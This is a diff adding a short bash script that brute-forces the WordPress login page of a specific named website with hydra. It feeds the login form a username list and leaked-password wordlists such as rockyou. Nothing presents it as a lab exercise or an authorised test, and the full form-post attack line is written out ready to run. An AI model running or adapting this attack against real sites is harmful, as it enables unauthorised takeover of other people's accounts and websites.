@@ -1,0 +1,13 @@
+#!/bin/bash
+
+LIST1=/opt/SecLists/Passwords/Leaked-Databases/rockyou-75.txt
+LIST2=/opt/SecLists/Passwords/2020-200_most_used_passwords.txt
+LIST3=/opt/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
+
+
+sudo -i hydra -L lists/usrname.txt -P {$LIST1, $LIST2, $LIST3} baroninvestigativegroup.com -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
+#									%2Fwp-admin%2F&reauth=1
+
+
+
+#REDIRECT=http://www.baroninvestigativegroup.com/wp-login.php?redirect_to=http%3A%2F%2Fwww.baroninvestigativegroup.com%2Fwp-admin%2F&reauth=1
